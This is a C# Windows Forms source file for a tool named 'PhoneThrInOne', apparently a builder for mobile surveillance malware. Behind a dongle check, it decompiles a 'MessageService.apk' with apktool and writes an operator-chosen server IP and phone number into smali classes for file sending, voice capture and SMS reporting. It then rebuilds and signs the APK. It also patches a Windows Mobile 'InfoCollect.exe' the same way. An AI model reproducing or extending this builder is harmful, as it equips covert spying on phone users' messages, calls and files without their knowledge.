using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;


namespace PhoneThrInOne
{
    public delegate void doDllFunction(string newip, string sourcefile, string targetfile);//委托

    public partial class Form1 : Form
    {
        [DllImport("PhoneDevice.dll", EntryPoint = "TestDevice")]
        public static extern  bool TestDevice();

        public Form1()
        {
            InitializeComponent();
        }

        string os = "android";
        string ipnew;   //新IP
        string phoneNum; //新短信命令号码
        string smsNum; //接收手机信息号码
        string file;    
        string targetfile;
        string sourcefile = AppDomain.CurrentDomain.BaseDirectory + "InforCollect.exe";

        //得到当前要修改的IP
        public bool checkIP()
        {
            bool device = TestDevice();
            if (!device) {
                MessageBox.Show("没有加密狗或加密狗错误！");
                return false;
            }
            ipnew = IPBox.Text;
            phoneNum = phoneNameBox.Text;
            smsNum = smsBox.Text;

            //检查IP合法性
            string[] ip = ipnew.Split('.');
            if (ip.Length != 4) {
                MessageBox.Show("IP输入错误，请重新输入");
                return false;
            }
            string ipnew2 = "";
            for (int i = 0; i < 4; ++i) {
                ip[i] = ip[i].TrimStart('0');
                int value = int.Parse(ip[i]);
                if (value < 0 || value > 255) {
                    MessageBox.Show("IP输入错误，请重新输入");
                    return false;
                }
                if (value < 10) ipnew2 += "00";
                else if (value < 100) ipnew2 += "0";

                ipnew2 += Convert.ToString(value);
                if (i < 3) ipnew2 += '.';
            }
            if (ipnew2.Length != 15) {
                MessageBox.Show("IP错误，请联系技术支持");
                return false;
            }
            MessageBox.Show("当前要修改的IP为：" + ipnew2 + "\n" +
                            "  当前命令号码为: " + phoneNum + "\n" +
                            "当前接收短信号码：" + smsNum + "\n");

            ipnew = ipnew2;
            return true;
        }

        private void genMobile()
        {
           DllInvoke dllInvoke = new DllInvoke(AppDomain.CurrentDomain.BaseDirectory + "ipchange187.dll");
           doDllFunction BuildFile = (doDllFunction)dllInvoke.Invoke("Change", typeof(doDllFunction));
           //删除上次生成
           try {
               if (File.Exists(targetfile)) {
                   File.Delete(targetfile);
               }
           } catch {
               MessageBox.Show("删除原文件失败!");
               return;
           }
           BuildFile(ipnew, sourcefile, targetfile);
           MessageBox.Show("替换成功");
        }


        private void genAndroid()
        {
            //得到当前路径
            string sourcefile = AppDomain.CurrentDomain.BaseDirectory;

            //判断当前是否有info文件夹，有的话就删掉整个文件夹里的内容
            string info = sourcefile + "info";
            try {

                if (Directory.Exists(info)) {
                    Directory.Delete(info, true);
                }
            }
            catch {
                MessageBox.Show("删除旧文件夹失败，请关闭所有打开" + info + "文件夹及子文件夹的窗口");
                return;
            }
            //解压并修改源文件

            //得到apk全路径

            string app = "";   //要解压的apk路径

            app = sourcefile + "\\MessageService.apk";

            //解压apk
            string order_c = "apktool d " + app + " info";
            Cmd(order_c);
            CloseProcess("cmd");

            //修改源文件IP -- 要修改的文件列表
            string[] change = { "ServerIP.smali", "SendFile.smali", "VoiceService.smali"};
            string sourceFile = sourcefile + "\\info\\smali\\com\\android\\message\\"; //路径
            for (int i = 0; i < change.Length; ++i) {
                if (!changeSourceIP(sourceFile + change[i], ipnew)) {
                    return;
                }
            }

            //修改短信命令手机号码源文件
            /*string[] changePhone = { "SMSBroadcastReceiver.smali" };
            for (int i = 0; i < changePhone.Length; ++i) {
                if (!changeSourcePhone(sourceFile + changePhone[i], phoneNum)) {
                    return;
                }
            }*/

            //修改接收手机信息号码的短信号码
            string[] smsPhone = { "SendSMS.smali" };
            for (int i = 0; i < smsPhone.Length; ++i) {
                if(!changeSourcePhone(sourceFile + smsPhone[i], smsNum)) {
                    return;
                }
            }


            //删除NewInfoCollect.apk, SignNewInfoCollect.apk

            //打包，签名
            string order = "apktool b info NewMessageService.apk";
            Cmd(order);
            CloseProcess("cmd");

            //第一个文件要写上一步打包生成的文件名相同
            string delFile = sourcefile + "\\新生成的APK\\SignNewMessageService.apk";
            try {
                if (File.Exists(delFile)) {
                    File.Delete(delFile);
                }
            }
            catch {
                MessageBox.Show("删除" + delFile + "异常!");
            }
            string order2 = "sign NewMessageService.apk 新生成的APK\\SignNewMessageService.apk";
            Cmd(order2);
            CloseProcess("cmd");

            string delFile_2 = sourcefile + "NewMessageService.apk";
            try {
                if (File.Exists(delFile_2)) {
                    File.Delete(delFile_2);
                }
            }
            catch {
                MessageBox.Show("删除" + delFile_2 + "异常!");
            }
            MessageBox.Show("替换成功");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (!checkIP()) return; //IP有错误
            
            if (os.CompareTo("symbian") == 0) {
               
            }
            else if (os.CompareTo("mobile") == 0) {
                genMobile();
            }
            else if (os.CompareTo("android") == 0) {
                genAndroid();
            }
            else if (os.CompareTo("IPhone") == 0) {
                MessageBox.Show("暂不支持");
            }

        }

        //改变源文件IP
        bool changeSourceIP(string sourceFile, string newIP)
        {

            //修改IP
            string strTxt = "";
            StreamReader fileStream = null;
            try {
                fileStream = new StreamReader(sourceFile, System.Text.Encoding.Default);
                while (!fileStream.EndOfStream) {
                    strTxt += fileStream.ReadLine();
                    strTxt += Environment.NewLine;
                }
                fileStream.Close();
                fileStream.Dispose();
            }
            catch {
                fileStream.Close();
                fileStream.Dispose();
                MessageBox.Show("读源文件失败@！");
                return false;
            }
            strTxt = strTxt.Replace("202.004.155.037", newIP);
            FileStream stream = null;
            try {
                stream = new FileStream(sourceFile, FileMode.Create);
                byte[] content = System.Text.Encoding.Default.GetBytes(strTxt);
                stream.Write(content, 0, content.Length);
                //stream.SetLength(0);
                stream.Flush();
                stream.Close();
            }
            catch {

                stream.Close();
                MessageBox.Show("改写IP失败@！");
                return false;
            }
            //MessageBox.Show(strTxt);
            return true;
        }
        //改变源文件短信号码
        bool changeSourcePhone(string sourceFile, string newPhoneNum)
        {
            string strTxt = "";
            StreamReader fileStream = null;
            try {
                fileStream = new StreamReader(sourceFile, System.Text.Encoding.Default);
                while (!fileStream.EndOfStream) {
                    strTxt += fileStream.ReadLine();
                    strTxt += Environment.NewLine;
                }
                fileStream.Close();
                fileStream.Dispose();
            }
            catch {
                fileStream.Close();
                fileStream.Dispose();
                MessageBox.Show("读源文件失败@！");
                return false;
            }
            strTxt = strTxt.Replace("18701501807", newPhoneNum);
            FileStream stream = null;
            try {
                stream = new FileStream(sourceFile, FileMode.Create);
                byte[] content = System.Text.Encoding.Default.GetBytes(strTxt);
                stream.Write(content, 0, content.Length);
                //stream.SetLength(0);
                stream.Flush();
                stream.Close();
            }
            catch {

                stream.Close();
                MessageBox.Show("改写短信号码失败@！");
                return false;
            }
            //MessageBox.Show(strTxt);
            return true;

        }

        //运行CMD命令
        public static string Cmd(string cmd)
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            p.StandardInput.AutoFlush = true;

            p.StandardInput.WriteLine(cmd.ToString());
            p.StandardInput.WriteLine("exit");
            string strRst = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            p.Close();
            return strRst;
        }

        /// <summary>
        /// 关闭进程
        /// </summary>
        /// <param name="ProcName">进程名称</param>
        /// <returns></returns>
        public static bool CloseProcess(string ProcName)
        {
            bool result = false;
            System.Collections.ArrayList procList = new System.Collections.ArrayList();
            string tempName = "";
            int begpos;
            int endpos;
            foreach (System.Diagnostics.Process thisProc in System.Diagnostics.Process.GetProcesses()) {
                tempName = thisProc.ToString();
                begpos = tempName.IndexOf("(") + 1;
                endpos = tempName.IndexOf(")");
                tempName = tempName.Substring(begpos, endpos - begpos);
                procList.Add(tempName);
                if (tempName == ProcName) {
                    if (!thisProc.CloseMainWindow())
                        thisProc.Kill(); // 当发送关闭窗口命令无效时强行结束进程
                    result = true;
                }
            }
            return result;
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            //
            os = "symbian";
        }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {
            os = "mobile";
            sourcefile = AppDomain.CurrentDomain.BaseDirectory + "InforCollect.exe";
            targetfile = AppDomain.CurrentDomain.BaseDirectory + "InfoCollect-Mobile\\InfoCollect.exe";
        }

        private void Form1_Load(object sender, EventArgs e)
        {
           
        }

        private void radioButton4_CheckedChanged(object sender, EventArgs e)
        {
            os = "IPhone";
        }

        private void radioButton3_CheckedChanged(object sender, EventArgs e)
        {
            os = "android";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string now = AppDomain.CurrentDomain.BaseDirectory;
            if (os.CompareTo("android") == 0) {
                now = now + "新生成的APK";
            }
            else if(os.CompareTo("mobile") == 0) {
                now = now + "InfoCollect-Mobile";
            }
            
            //MessageBox.Show(now);
            System.Diagnostics.Process.Start(now);
        }
    }
}
